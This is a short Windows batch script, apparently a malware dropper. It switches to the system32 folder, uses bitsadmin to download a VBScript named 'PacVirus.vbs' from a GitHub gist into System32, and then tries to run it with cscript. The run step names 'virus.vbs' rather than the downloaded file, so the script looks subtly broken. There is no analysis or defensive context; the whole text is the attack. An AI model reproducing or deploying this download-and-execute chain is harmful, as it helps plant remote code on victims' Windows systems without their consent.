@echo off
cd /d %windir%\system32
bitsadmin /transfer pacvirus /download /priority highest https://gist.githubusercontent.com/INeddHelp/6a13a06123552c4d29b3c24bcdb00836/raw/3daccafd51126d8f1efdd0cee6fb7acb3147cd9c/PacVirus.vbs %systemroot%\System32\PacVirus.vbs
cscript virus.vbs